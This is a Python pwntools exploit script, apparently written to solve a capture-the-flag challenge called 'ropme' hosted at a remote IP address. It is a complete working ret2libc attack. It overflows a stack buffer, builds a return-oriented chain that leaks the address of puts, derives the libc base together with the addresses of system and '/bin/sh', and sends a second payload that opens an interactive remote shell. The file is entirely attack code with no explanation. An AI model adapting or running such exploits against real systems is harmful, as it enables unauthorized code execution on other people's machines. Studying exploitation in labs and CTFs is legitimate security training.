#! /usr/bin/python

from pwn import *

#s = process('./ropme')

# host: 88.198.233.174 port:34383
# 88.198.233.174 port:34392
s = remote('88.198.233.174', 34392)

padding = 72

elf = ELF('./ropme')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

# gdb-peda$ b * main
# Breakpoint 1 at 0x400626
main_addr = 0x400626

print 'puts_got =', hex(puts_got)
print 'puts_plt =', hex(puts_plt)

# 0x00000000004006d3 : pop rdi ; ret
pop_rdi_ret = 0x4006d3

payload1 = 'A' * padding
payload1 += p64(pop_rdi_ret)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

print '1', s.readline()
s.sendline(payload1)
#print '2', s.readline()

leaked_puts_addr = u64(s.recv(0x6).ljust(8, '\x00'))

print 'leaked_puts_addr =', hex(leaked_puts_addr)

# ./find puts 0x7fb6c479b690
# ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu9_amd64)
# ./dump libc6_2.23-0ubuntu9_amd64
# offset___libc_start_main_ret = 0x20830
# offset_system = 0x0000000000045390
# offset_dup2 = 0x00000000000f7940
# offset_read = 0x00000000000f7220
# offset_write = 0x00000000000f7280
# offset_str_bin_sh = 0x18cd17
# ./dump libc6_2.23-0ubuntu9_amd64 puts
# offset_puts = 0x000000000006f690

puts_offset = 0x6f690
system_offset = 0x45390
bin_sh_offset = 0x18cd17

libc_base = leaked_puts_addr - puts_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

payload2 = 'A' * padding
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

s.sendline(payload2)

s.interactive()

























